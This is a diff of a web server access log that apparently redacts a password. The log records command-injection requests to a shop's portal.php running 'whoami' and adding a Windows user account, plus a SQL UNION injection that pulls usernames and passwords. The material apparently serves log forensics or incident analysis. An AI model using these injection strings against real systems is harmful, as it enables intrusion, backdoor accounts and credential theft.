@@ -17,7 +17,7 @@
 203.0.113.42 - - [12/Mar/2024:09:16:15 +0000] "POST /shop/login.php HTTP/1.1" 302 330 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0"
 203.0.113.42 - - [12/Mar/2024:09:16:16 +0000] "GET /shop/portal.php HTTP/1.1" 200 9420 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0"
 203.0.113.42 - - [12/Mar/2024:09:16:40 +0000] "GET /shop/portal.php?msg=%22%22%3Bsystem(%27whoami%27) HTTP/1.1" 200 12040 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0"
-203.0.113.42 - - [12/Mar/2024:09:16:58 +0000] "GET /shop/portal.php?msg=%22%22%3Bsystem(%27net%20user%20backup%20P%40ss123%20/add%27) HTTP/1.1" 200 12066 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0"
+203.0.113.42 - - [12/Mar/2024:09:16:58 +0000] "GET /shop/portal.php?msg=%22%22%3Bsystem(%27net%20user%20svc-backup%20PASSWORD_REDACTED%20/add%27) HTTP/1.1" 200 12066 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0"
 10.0.4.11 - - [12/Mar/2024:09:20:31 +0000] "GET /shop/cart.php HTTP/1.1" 200 4210 "http://shop.local/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
 10.0.4.11 - - [12/Mar/2024:09:21:02 +0000] "POST /shop/cart.php HTTP/1.1" 200 4310 "http://shop.local/cart.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
 10.0.4.12 - - [12/Mar/2024:09:22:44 +0000] "GET /shop/index.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 500 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
